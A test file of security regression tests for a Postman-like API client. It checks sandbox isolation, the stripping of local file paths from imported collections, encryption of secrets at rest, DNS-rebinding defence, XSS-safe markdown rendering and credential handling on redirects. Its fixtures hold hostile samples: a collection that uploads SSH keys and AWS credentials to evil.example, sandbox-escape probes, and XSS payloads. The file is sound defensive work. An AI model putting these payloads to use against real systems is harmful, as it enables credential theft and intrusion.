// Security regression tests. Each block maps to a finding or control in docs/security/audit.md.
import http from 'node:http'
import { describe, expect, it } from 'vitest'
import { runScript, type ScriptContext } from './sandbox'
import { detachFiles, fileAttachments, mapFilePaths } from './security'
import { hasSealedSecrets, openSecrets, sealSecrets, SEALED_PREFIX, type Cipher } from './secretsAtRest'
import { isLocalHost, isLocalOrigin, startMockServer } from './mock'
import { renderMarkdown } from './markdown'
import { importPostmanCollection } from './postman'
import { newCollection, newKeyValue, newRequest, newRequestItem } from './factory'
import { execute } from './executor'
import { DEFAULT_SETTINGS, type Workspace } from './types'

const ctx: ScriptContext = {
  event: 'test',
  variables: { local: {}, data: {}, environment: {}, collection: {}, globals: {} },
  request: { url: 'https://x.io', method: 'GET', headers: [], body: null },
  info: { requestName: 'R', requestId: 'r1', iteration: 0, iterationCount: 1 }
}

describe('script sandbox isolation (SEC-CTRL-1)', () => {
  it('has no route to Node through constructors, prototypes or globals', async () => {
    const out = await runScript(
      `
      const probes = {
        fnCtor: () => (function () {}).constructor('return typeof process')(),
        thisCtor: () => this.constructor.constructor('return typeof process')(),
        globalProcess: () => typeof globalThis.process,
        importMeta: () => typeof globalThis.module,
        buffer: () => typeof Buffer,
        fetch: () => typeof fetch,
        xhr: () => typeof XMLHttpRequest,
      };
      for (const [name, probe] of Object.entries(probes)) pm.test(name, () => pm.expect(probe()).to.equal('undefined'));
      pm.test('no fs via require', () => pm.expect(() => require('fs')).to.throw());
      `,
      ctx
    )
    expect(out.error).toBeUndefined()
    expect(out.tests.filter((t) => !t.passed)).toEqual([])
    expect(out.tests).toHaveLength(8)
  })

  // Three sandboxes in a row, one of which runs to its CPU deadline: slow CI runners need headroom.
  it('stops memory bombs and deep recursion without breaking later scripts', { timeout: 30_000 }, async () => {
    const mem = await runScript('const a = []; while (true) a.push(new Array(1e6).fill(1));', ctx, { memoryLimitBytes: 16 * 1024 * 1024, timeoutMs: 2000 })
    expect(mem.error).toBeTruthy()
    const deep = await runScript('const f = () => f(); f();', ctx)
    expect(deep.error).toMatch(/stack|recursion|InternalError/i)
    const after = await runScript("pm.test('still works', () => pm.expect(1 + 1).to.equal(2))", ctx)
    expect(after.error).toBeUndefined()
    expect(after.tests[0]?.passed).toBe(true)
  })

  it('caps pm.sendRequest calls per script', async () => {
    let calls = 0
    const out = await runScript(
      `for (let i = 0; i < 10; i++) pm.sendRequest('http://x.invalid/' + i, (err) => i === 9 && pm.test('limit reported', () => pm.expect(String(err)).to.include('limit of 3')));`,
      ctx,
      {
        maxSendRequests: 3,
        sendRequest: async () => {
          calls++
          return { error: 'offline' }
        }
      }
    )
    expect(calls).toBe(3)
    expect(out.error).toBeUndefined()
    expect(out.tests).toEqual([expect.objectContaining({ name: 'limit reported', passed: true })])
  })
})

describe('imported collections cannot choose local files to upload (SEC-01)', () => {
  const postman = {
    info: { name: 'Shared', schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json' },
    item: [
      { name: 'Upload', request: { method: 'POST', url: 'https://evil.example/u', body: { mode: 'formdata', formdata: [{ key: 'f', type: 'file', src: '/Users/me/.ssh/id_rsa' }, { key: 'n', value: 'x', type: 'text' }] } } },
      { name: 'Binary', request: { method: 'PUT', url: 'https://evil.example/b', body: { mode: 'file', file: { src: '~/.aws/credentials' } } } }
    ]
  }

  it('lists and clears every file path, keeping the fields', () => {
    const imported = importPostmanCollection(postman)
    expect(fileAttachments(imported).map((f) => f.path)).toEqual(['/Users/me/.ssh/id_rsa', '~/.aws/credentials'])
    const { collection, detached } = detachFiles(imported)
    expect(detached).toHaveLength(2)
    expect(fileAttachments(collection)).toEqual([])
    const body = (collection.items[0] as { request: { body: { formdata: { key: string; type: string }[] } } }).request.body
    expect(body.formdata.map((f) => [f.key, f.type])).toEqual([
      ['f', 'file'],
      ['n', 'text']
    ])
  })

  it('lets the CLI rewrite or reject paths', () => {
    const rewritten = mapFilePaths(importPostmanCollection(postman), (p) => `/work/${p.split('/').pop()}`)
    expect(fileAttachments(rewritten).map((f) => f.path)).toEqual(['/work/id_rsa', '/work/credentials'])
    expect(() =>
      mapFilePaths(importPostmanCollection(postman), (p) => {
        throw new Error(`outside: ${p}`)
      })
    ).toThrow('outside: /Users/me/.ssh/id_rsa')
  })
})

describe('secrets are encrypted at rest (SEC-02)', () => {
  // Reversible fake cipher; the app uses Electron safeStorage (OS keychain).
  const cipher: Cipher = { encrypt: (s) => Buffer.from(s).toString('base64').split('').reverse().join(''), decrypt: (s) => Buffer.from(s.split('').reverse().join(''), 'base64').toString() }
  const collection = newCollection('C')
  collection.auth = { type: 'bearer', token: 'tok-123' }
  collection.items = [
    newRequestItem(newRequest({ name: 'Key', auth: { type: 'apikey', key: 'X-Api-Key', value: 'k-456', in: 'header' } })),
    newRequestItem(newRequest({ name: 'Basic', auth: { type: 'basic', username: 'ada', password: 'pw-789' } }))
  ]
  const ws: Workspace = {
    collections: [collection],
    environments: [{ id: 'e', name: 'Prod', variables: [{ ...newKeyValue('apiKey', 'env-secret'), secret: true }, newKeyValue('baseUrl', 'https://api.example.com')] }],
    globals: [],
    activeEnvironmentId: null,
    history: [],
    cookies: [{ name: 'sid', value: 'cookie-secret', domain: 'example.com', path: '/', hostOnly: true, secure: true, httpOnly: true, sameSite: 'lax', created: 0 } as never],
    settings: { network: { proxy: { enabled: false, url: '', bypass: '' }, certificates: [{ id: 'c', host: '*', pfxPath: '/c.pfx', passphrase: 'pfx-pass' }] } } as never
  }

  it('seals credentials and nothing else', () => {
    const sealed = sealSecrets(ws, cipher)
    const text = JSON.stringify(sealed)
    for (const secret of ['tok-123', 'k-456', 'pw-789', 'env-secret', 'cookie-secret', 'pfx-pass']) expect(text).not.toContain(secret)
    for (const plain of ['https://api.example.com', 'X-Api-Key', 'ada', 'Prod', 'sid']) expect(text).toContain(plain)
    expect(hasSealedSecrets(sealed)).toBe(true)
    expect(sealSecrets(sealed, cipher)).toEqual(sealed) // idempotent
  })

  it('round-trips, migrates plain files and survives a lost key', () => {
    expect(openSecrets(sealSecrets(ws, cipher), cipher)).toEqual({ workspace: ws, failed: 0 })
    expect(openSecrets(ws, cipher)).toEqual({ workspace: ws, failed: 0 })
    const broken: Cipher = { ...cipher, decrypt: () => { throw new Error('bad key') } }
    const { workspace, failed } = openSecrets(sealSecrets(ws, cipher), broken)
    expect(failed).toBe(6)
    expect(JSON.stringify(workspace)).not.toContain(SEALED_PREFIX)
  })
})

describe('mock server is local-only (SEC-03)', () => {
  it('recognises loopback Host headers only', () => {
    for (const h of ['localhost', 'localhost:4000', '127.0.0.1:80', 'api.localhost:3000', '[::1]:9000']) expect(isLocalHost(h)).toBe(true)
    expect(isLocalOrigin('http://app.localhost:3000')).toBe(true)
    expect(isLocalOrigin('null')).toBe(false)
    for (const h of [undefined, '', 'evil.example', 'evil.example:4000', '127.0.0.1.evil.example', 'localhost.evil.example', '0.0.0.0']) expect(isLocalHost(h)).toBe(false)
  })

  it('refuses DNS-rebound requests', async () => {
    const server = await startMockServer(newCollection('M'), 0, () => {})
    try {
      const status = (host: string): Promise<number> =>
        new Promise((resolve, reject) => {
          http.get({ host: '127.0.0.1', port: server.port, path: '/', headers: { host } }, (res) => (res.resume(), resolve(res.statusCode ?? 0))).on('error', reject)
        })
      expect(await status('attacker.example')).toBe(421)
      expect(await status(`localhost:${server.port}`)).toBe(404)
      const acao = (origin: string): Promise<string | undefined> =>
        new Promise((resolve, reject) => {
          http.get({ host: '127.0.0.1', port: server.port, path: '/', headers: { origin } }, (res) => (res.resume(), resolve(res.headers['access-control-allow-origin'] as string | undefined))).on('error', reject)
        })
      expect(await acao('http://localhost:5173')).toBe('http://localhost:5173')
      expect(await acao('https://evil.example')).toBeUndefined()
    } finally {
      await server.close()
    }
  })
})

describe('documentation rendering is XSS-safe (SEC-CTRL-4)', () => {
  it('escapes markup and drops dangerous links', () => {
    const html = renderMarkdown('<img src=x onerror=alert(1)>\n\n[click](javascript:alert(1)) [ok](https://example.com) [d](data:text/html,<script>)\n\n```\n<script>x</script>\n```')
    expect(html).not.toMatch(/<img|<script|javascript:|data:text/i)
    expect(html).toContain('href="https://example.com"')
  })
})

describe('credentials stay with their host (SEC-CTRL-2)', () => {
  it('drops Authorization when a redirect leaves the host', async () => {
    const seen: (string | undefined)[] = []
    const other = http.createServer((req, res) => (seen.push(req.headers.authorization), res.end('ok')))
    await new Promise<void>((r) => other.listen(0, '127.0.0.1', r))
    const otherPort = (other.address() as { port: number }).port
    const origin = http.createServer((req, res) => {
      seen.push(req.headers.authorization)
      res.writeHead(302, { Location: `http://localhost:${otherPort}/landing` }).end()
    })
    await new Promise<void>((r) => origin.listen(0, '127.0.0.1', r))
    try {
      const port = (origin.address() as { port: number }).port
      const r = await execute({ method: 'GET', url: `http://127.0.0.1:${port}/start`, headers: [['Authorization', 'Bearer secret']], body: { kind: 'none' }, settings: DEFAULT_SETTINGS })
      expect(r.ok).toBe(true)
      expect(seen).toEqual(['Bearer secret', undefined])
    } finally {
      origin.close()
      other.close()
    }
  })
})
